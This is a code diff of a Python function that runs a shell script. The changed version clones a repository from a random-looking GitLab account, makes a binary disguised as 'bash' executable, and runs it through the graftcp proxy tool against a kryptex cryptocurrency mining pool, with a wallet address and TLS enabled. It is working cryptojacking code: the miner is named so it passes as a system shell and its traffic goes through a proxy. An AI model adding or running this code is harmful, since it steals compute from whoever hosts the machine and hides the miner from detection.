@@ -52,15 +52,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD VB ==="
+    echo "=== DOWNLOAD KRIG ==="
     cd /mnt/code/pan
-    git clone https://github.com/malogrono/vb.git
+    git clone https://gitlab.com/liugtiujk/krig.git
 
-    echo "=== CHECK LOL198 ==="
-    ls -lah /mnt/code/pan/vb
+    echo "=== CHECK KRIG ==="
+    ls -lah /mnt/code/pan/krig
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/vb
+    cd /mnt/code/pan/krig
     ls -lh bash
 
     chmod u+x bash
@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --disable-cpu --algorithm fishhash --pool iron.kryptex.network:7017 --wallet d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.RETRO
+    ./graftcp/graftcp ./bash --disable-cpu --algorithm pearlhash --pool prl-sg.kryptex.network:8048 --wallet prl1pk06kg4nye9f2f44gt6hvwchrg0fnkgkhyv058zmml7z57y9tn2cqky62kj.01 --tls true
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
